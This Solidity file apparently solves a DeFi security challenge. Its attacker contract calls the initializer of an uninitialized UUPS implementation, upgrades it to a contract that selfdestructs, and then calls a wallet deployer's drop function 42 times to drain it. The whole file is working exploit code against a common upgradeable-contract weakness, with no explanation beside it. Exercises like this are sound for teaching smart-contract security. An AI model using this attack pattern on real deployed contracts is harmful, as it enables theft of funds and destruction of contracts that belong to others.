// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "hardhat/console.sol";

interface IAuthorizer {
    function init(address[] memory _wards, address[] memory _aims) external;

    function upgradeToAndCall(address imp, bytes memory wat) external payable;
}

interface IWalletDeployer {
    function drop(bytes memory wat) external;
}

contract NewImpl is UUPSUpgradeable {
    function selfDestruct() public {
        uint size;
        address _mom = address(this);
        assembly {
            size := extcodesize(_mom)
        }
        console.log("Size before selfdestruct:", size);

        console.log("Destructing");
        selfdestruct(payable(msg.sender));
        console.log("Unreachable");
    }

    // function can(
    //     address /* usr */,
    //     address /* aim */
    // ) public pure returns (bool) {
    //     return true;
    // }

    function _authorizeUpgrade(address newImplementation) internal override {}
}

contract AuthorizerAttacker {
    function attack(address impl, address proxy) public {
        IAuthorizer authorizer = IAuthorizer(impl);
        authorizer.init(new address[](0), new address[](0));

        NewImpl newImpl = new NewImpl();
        console.log("new impl:", address(newImpl));
        authorizer.upgradeToAndCall(
            address(newImpl),
            abi.encodeWithSignature("selfDestruct()")
        );

        for (uint256 i; i < 42; ) {
            console.log(i);
            IWalletDeployer(proxy).drop("");
            unchecked {
                i++;
            }
        }
    }
}
